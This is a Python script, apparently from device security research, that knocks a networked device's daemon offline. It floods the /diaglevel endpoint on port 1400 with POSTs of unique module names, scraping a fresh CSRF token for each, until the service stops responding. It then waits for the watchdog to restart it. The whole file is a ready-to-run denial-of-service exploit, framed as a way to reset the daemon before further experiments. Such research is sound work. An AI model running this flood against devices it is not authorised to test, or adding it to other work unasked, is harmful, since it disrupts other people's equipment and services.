#!/usr/bin/env python3
"""Restart the daemon via the /diaglevel hash flood (no reboot, no key).

GET /diaglevel for a token, POST a unique module name, repeat until the daemon
stops answering, then wait for the watchdog restart. Used to get a fresh daemon
before a /setstring experiment.

    diagflood.py --ip 192.168.4.202 --max 600
"""
import argparse
import re
import subprocess
import time
import urllib.parse


def curl(args, timeout=4):
    return subprocess.run(["curl", "-s", "-m", str(timeout)] + args,
                          capture_output=True, text=True)


def up(ip):
    return curl(["-o", "/dev/null", "-w", "%{http_code}",
                 f"http://{ip}:1400/status/VERSION"], timeout=2).stdout.strip() == "200"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--ip", required=True)
    ap.add_argument("--max", type=int, default=600)
    a = ap.parse_args()

    ip = a.ip
    run = "%x" % int(time.time())
    for i in range(a.max):
        r = curl([f"http://{ip}:1400/diaglevel"])
        m = re.search(r'name="csrfToken" value="([^"]*)"', r.stdout)
        if not m:
            time.sleep(1)
            continue
        body = "csrfToken=%s&module=m%s_%05d&level=1" % (
            urllib.parse.quote(m.group(1), safe=""), run, i)
        curl(["-o", "/dev/null", "-X", "POST",
              "-H", "Content-Type: application/x-www-form-urlencoded",
              "--data-binary", body, f"http://{ip}:1400/diaglevel"])
        if i % 50 == 0:
            print(f"{i} ...", flush=True)
        if not up(a.ip):
            print(f"daemon down after {i} inserts")
            break
    else:
        print(f"no kill after {a.max}")

    t0 = time.time()
    while time.time() - t0 < 120:
        if up(a.ip):
            print(f"recovered after {time.time()-t0:.0f}s")
            return 0
        time.sleep(2)
    print("no recovery in 120s")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
